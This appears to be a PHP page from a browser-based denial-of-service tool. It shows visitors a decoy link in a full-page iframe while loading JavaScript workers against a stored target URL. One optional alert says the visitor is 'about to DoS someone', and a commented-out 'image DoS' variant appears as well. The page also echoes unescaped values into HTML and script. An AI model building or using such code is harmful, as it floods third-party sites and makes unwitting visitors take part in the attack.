<?php
require_once("../config.php");
require_once($PHP_INCLUDE_PATH."db_functions.php");
	$entry = get_hash_entry($_GET['hash']);
    if(mysql_num_rows($entry)!=0){
	    $row = mysql_fetch_assoc($entry);
        $title = $row['title'];
        $link = $row['link'];
        $target = stripslashes($row['target']);
        $worker = "js/worker.js";
        if($row['use_get']==1){
            $worker = "js/worker_get.js";
        }

        if(is_banned_domain($target)){
            die("Link not found.");
        }
    } else {
        die("Link not found.");
    }
?>

<html><head><title>

<?php
echo $title.'</title>';
if($WARNUSERS){
    echo '<script>alert("WARNING: you are about to DoS someone. Exit if you don\'t want to.</script>';
}
?>

<script type="text/javascript" src="js/tracking.js">
</script>

<style>
#page {width: 100%; height: 100%;}
body{margin:0}
</style>

<?php
$parsed = parse_url($link);
echo '<link rel="shortcut icon" href="http://'.$parsed['host'].'/favicon.ico" type="image/x-icon" />';
?>

<script type="text/javascript">

<?php
echo "var target = '".$target."';\n";
echo "var worker_loc = '".$worker."';";
?>

</script>

<script type="text/javascript" src="js/run_worker.js">
</script>

</head>
<body>

<?php
//Does image DoS as well. Not very effective, and signals activity.
/*
echo '<img style="display:block;position:absolute;" src="'.$target.'" onload="asdf()" onerror="asdf()" width="1" height="1">';
*/
echo '<iframe id="page" name="page" src="'.$link.'" frameborder="0" noresize="noresize" style="overflow:visible"></iframe>';
?>

</body>
</html>
